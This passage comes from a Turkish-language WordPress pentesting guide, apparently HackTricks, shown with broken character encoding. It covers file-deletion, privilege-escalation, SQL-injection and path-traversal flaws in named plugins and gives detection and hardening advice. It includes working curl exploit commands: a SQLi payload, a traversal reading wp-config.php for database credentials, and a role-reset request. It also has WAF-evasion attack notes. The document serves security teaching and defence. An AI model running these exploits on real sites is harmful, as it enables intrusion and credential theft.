Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### Tespit kontrol listesi

* `add_action( 'wp_ajax_nopriv_...')` iÃ§inde filesystem helper'larÄ±nÄ± (`copy()`, `unlink()`, `$wp_filesystem->delete()`, vb.) Ã§aÄŸÄ±ran herhangi bir callback.
* TemizlenmemiÅŸ kullanÄ±cÄ± girdilerinin path'lere birleÅŸtirilmesi (`$_POST`, `$_GET`, `$_REQUEST` Ã¶ÄŸelerine bakÄ±n).
* `check_ajax_referer()` ve `current_user_can()`/`is_user_logged_in()` Ã§aÄŸrÄ±larÄ±nÄ±n eksik olmasÄ±.

#### SertleÅŸtirme
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Her zaman** diske yapÄ±lan herhangi bir write/delete iÅŸlemini yetkili kabul edin ve Ã§ift kontrol edin:
> â€¢ Authentication  â€¢ Authorisation  â€¢ Nonce  â€¢ Input sanitisation  â€¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

BirÃ§ok eklenti, orijinal rol(leri) user meta iÃ§inde kaydederek daha sonra geri yÃ¼klenebilmeleri iÃ§in "view as role" veya geÃ§ici rol-deÄŸiÅŸtirme Ã¶zelliÄŸi uygular. EÄŸer restorasyon yolu yalnÄ±zca request parametrelerine (Ã¶r. `$_REQUEST['reset-for']`) ve eklenti tarafÄ±ndan tutulan bir listeye dayanÄ±yor ve capabilities kontrolÃ¼ ile geÃ§erli bir nonce doÄŸrulamasÄ± yapÄ±lmÄ±yorsa, bu bir vertical privilege escalation'a dÃ¶nÃ¼ÅŸÃ¼r.

GerÃ§ek bir Ã¶rnek Admin and Site Enhancements (ASE) eklentisinde (â‰¤ 7.6.2.1) bulundu. Reset dalÄ±, kullanÄ±cÄ± adÄ± dahili bir dizi `$options['viewing_admin_as_role_are']` iÃ§inde gÃ¶rÃ¼nÃ¼yorsa `reset-for=<username>` bazÄ±nda rolleri geri yÃ¼kledi, fakat mevcut rolleri kaldÄ±rmadan ve user meta `_asenha_view_admin_as_original_roles` iÃ§indeki kaydedilmiÅŸ rolleri yeniden eklemeden Ã¶nce ne `current_user_can()` kontrolÃ¼ ne de nonce doÄŸrulamasÄ± yaptÄ±:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Neden istismar edilebilir

- Sunucu tarafÄ± yetkilendirmesi olmadan `$_REQUEST['reset-for']` ve bir plugin seÃ§eneÄŸine gÃ¼venir.
- Bir kullanÄ±cÄ± daha Ã¶nce `_asenha_view_admin_as_original_roles` iÃ§inde daha yÃ¼ksek ayrÄ±calÄ±klara sahipse ve yetkisi dÃ¼ÅŸÃ¼rÃ¼ldÃ¼yse, sÄ±fÄ±rlama yoluna eriÅŸerek bunlarÄ± geri yÃ¼kleyebilir.
- BazÄ± daÄŸÄ±tÄ±mlarda, kimliÄŸi doÄŸrulanmÄ±ÅŸ herhangi bir kullanÄ±cÄ± `viewing_admin_as_role_are` iÃ§inde hÃ¢lÃ¢ bulunan baÅŸka bir kullanÄ±cÄ± adÄ± iÃ§in bir reset tetikleyebilir (bozuk yetkilendirme).

SaldÄ±rÄ± Ã¶nkoÅŸullarÄ±

- Ã–zelliÄŸin etkin olduÄŸu savunmasÄ±z plugin sÃ¼rÃ¼mÃ¼.
- Hedef hesapta, Ã¶nceki kullanÄ±mdan user meta'da saklanan eski yÃ¼ksek ayrÄ±calÄ±klÄ± bir rol bulunmasÄ±.
- Herhangi bir kimliÄŸi doÄŸrulanmÄ±ÅŸ oturum; reset akÄ±ÅŸÄ±nda nonce/capability kontrolÃ¼nÃ¼n eksik olmasÄ±.

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Zafiyetli sÃ¼rÃ¼mlerde bu, mevcut rolleri kaldÄ±rÄ±r ve kaydedilmiÅŸ orijinal rolleri (Ã¶r., `administrator`) yeniden ekler; bu da yetkilerin etkin bir biÃ§imde yÃ¼kseltilmesine yol aÃ§ar.

Detection checklist

- KullanÄ±cÄ± meta verilerinde "orijinal roller"i (Ã¶r., `_asenha_view_admin_as_original_roles`) saklayan rol-deÄŸiÅŸtirme Ã¶zelliklerini arayÄ±n.
- AÅŸaÄŸÄ±daki Ã¶zelliklere sahip sÄ±fÄ±rlama/geri yÃ¼kleme yollarÄ±nÄ± tespit edin:
  - KullanÄ±cÄ± adlarÄ±nÄ± `$_REQUEST` / `$_GET` / `$_POST`'ten okuyan.
  - `current_user_can()` ve `wp_verify_nonce()` / `check_admin_referer()` olmadan `add_role()` / `remove_role()` ile rolleri deÄŸiÅŸtiren.
  - Yetkilendirmeyi aktÃ¶rÃ¼n yetenekleri yerine bir plugin option dizisine (Ã¶r., `viewing_admin_as_role_are`) dayandÄ±ran.

Hardening

- Her durum-deÄŸiÅŸtiren dalda yetenek kontrollerini zorunlu kÄ±lÄ±n (Ã¶r., `current_user_can('manage_options')` veya daha sÄ±kÄ±).
- TÃ¼m rol/izin deÄŸiÅŸiklikleri iÃ§in nonces gerektirip bunlarÄ± doÄŸrulayÄ±n: `check_admin_referer()` / `wp_verify_nonce()`.
- Ä°stekle saÄŸlanan kullanÄ±cÄ± adlarÄ±na asla gÃ¼venmeyin; hedef kullanÄ±cÄ±yÄ± sunucu tarafÄ±nda kimliÄŸi doÄŸrulanmÄ±ÅŸ aktÃ¶re ve aÃ§Ä±k politikaya gÃ¶re belirleyin.
- Profil/rol gÃ¼ncellemelerinde "orijinal roller" durumunu geÃ§ersiz kÄ±lÄ±n; bÃ¶ylece eski yÃ¼ksek yetkili geri yÃ¼klemelerin Ã¶nÃ¼ne geÃ§in:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- GeÃ§ici rol deÄŸiÅŸimleri iÃ§in minimal durum saklamayÄ± ve zaman sÄ±nÄ±rlÄ±, capability-guarded tokenlar kullanmayÄ± dÃ¼ÅŸÃ¼nÃ¼n.

---

### WordPress/plugin CVE'leri iÃ§in WAF deÄŸerlendirmeleri

Genel edge/server WAF'lar geniÅŸ desenlere (SQLi, XSS, LFI) gÃ¶re ayarlanmÄ±ÅŸtÄ±r. BirÃ§ok yÃ¼ksek etkili WordPress/plugin hatasÄ± uygulamaya Ã¶zgÃ¼ mantÄ±k/auth hatalarÄ±dÄ±r ve motor WordPress rotalarÄ±nÄ± ve eklenti semantiÄŸini anlamÄ±yorsa zararsÄ±z trafik gibi gÃ¶rÃ¼nÃ¼r.

SaldÄ±rÄ± notlarÄ±

- Temiz payloadlarla eklenti-Ã¶zgÃ¼ endpointleri hedefleyin: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Ã–nce unauth yollarÄ±nÄ± deneyin (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). VarsayÄ±lan payloads genellikle obfuscation yapmadan baÅŸarÄ±lÄ± olur.
- Tipik yÃ¼ksek etkili vakalar: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Savunma notlarÄ±

- Eklenti CVE'lerini korumak iÃ§in genel WAF imzalarÄ±na gÃ¼venmeyin. Uygulama-katmanÄ±, zafiyete-Ã¶zel virtual patches uygulayÄ±n veya hÄ±zlÄ±ca gÃ¼ncelleyin.
- Kodda negatif regex filtreleri yerine positive-security kontrollerini tercih edin (capabilities, nonces, strict input validation).

## WordPress KorumasÄ±

### DÃ¼zenli GÃ¼ncellemeler

WordPress, plugins ve temalarÄ±n gÃ¼ncel olduÄŸundan emin olun. AyrÄ±ca otomatik gÃ¼ncellemenin wp-config.php'de etkinleÅŸtirildiÄŸini doÄŸrulayÄ±n:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
AyrÄ±ca, yalnÄ±zca gÃ¼venilir WordPress eklentilerini ve temalarÄ±nÄ± yÃ¼kleyin.

### GÃ¼venlik Eklentileri

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **DiÄŸer Ã–neriler**

- VarsayÄ±lan **admin** kullanÄ±cÄ±sÄ±nÄ± kaldÄ±rÄ±n
- GÃ¼Ã§lÃ¼ **parolalar** ve **2FA** kullanÄ±n
- KullanÄ±cÄ±larÄ±n **izinlerini** periyodik olarak **gÃ¶zden geÃ§irin**
- Brute Force saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in giriÅŸ denemelerini sÄ±nÄ±rlandÄ±rÄ±n
- `wp-admin.php` dosyasÄ±nÄ±n adÄ±nÄ± deÄŸiÅŸtirin ve yalnÄ±zca dahili eriÅŸime veya belirli IP adreslerinden eriÅŸime izin verin.


### Kimlik doÄŸrulamasÄ± gerektirmeyen SQL Injection (yetersiz doÄŸrulama) (WP Job Portal <= 2.3.2)

WP Job Portal iÅŸe alÄ±m eklentisi, en nihayetinde `modules/category/model.php::validateFormData()` iÃ§inde aÅŸaÄŸÄ±daki gÃ¼venlik aÃ§Ä±ÄŸÄ± iÃ§eren kodu Ã§alÄ±ÅŸtÄ±ran **savecategory** gÃ¶revini aÃ§Ä±ÄŸa Ã§Ä±kardÄ±:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Bu parÃ§acÄ±ÄŸÄ±n neden olduÄŸu sorunlar:

1. **Unsanitised user input** â€“ `parentid` HTTP isteÄŸinden doÄŸrudan geliyor.
2. **String concatenation inside the WHERE clause** â€“ `is_numeric()` / `esc_sql()` / prepared statement yok.
3. **Unauthenticated reachability** â€“ iÅŸlem `admin-post.php` Ã¼zerinden yÃ¼rÃ¼tÃ¼lse de, mevcut tek kontrol bir **CSRF nonce** (`wp_verify_nonce()`)'dir; bu nonce, shortcode'u iÃ§eren herkese aÃ§Ä±k bir sayfadan herhangi bir ziyaretÃ§i tarafÄ±ndan alÄ±nabilir.

#### Exploitation

1. Yeni bir nonce alÄ±n:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid`'i suistimal ederek rastgele SQL enjeksiyonu yapÄ±n:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
YanÄ±t, enjekte edilen sorgunun sonucunu aÃ§Ä±ÄŸa Ã§Ä±karÄ±r veya veritabanÄ±nÄ± deÄŸiÅŸtirir; bu da SQLi'yi kanÄ±tlar.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

BaÅŸka bir gÃ¶rev, **downloadcustomfile**, ziyaretÃ§ilerin path traversal yoluyla diskteki **herhangi bir dosyayÄ±** indirmesine izin veriyordu. ZayÄ±f sink `modules/customfield/model.php::downloadCustomUploadedFile()` iÃ§inde bulunuyor:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` saldÄ±rgan tarafÄ±ndan kontrol ediliyor ve **sanitizasyon yapÄ±lmadan** birleÅŸtiriliyor. Yine, tek engel Ã¶zgeÃ§miÅŸ sayfasÄ±ndan alÄ±nabilecek bir **CSRF nonce**.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Sunucu `wp-config.php` iÃ§eriÄŸini dÃ¶ndÃ¼rÃ¼yor, leaking DB credentials ve auth keys.

## Referanslar

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)

{{#include ../../banners/hacktricks-training.md}}
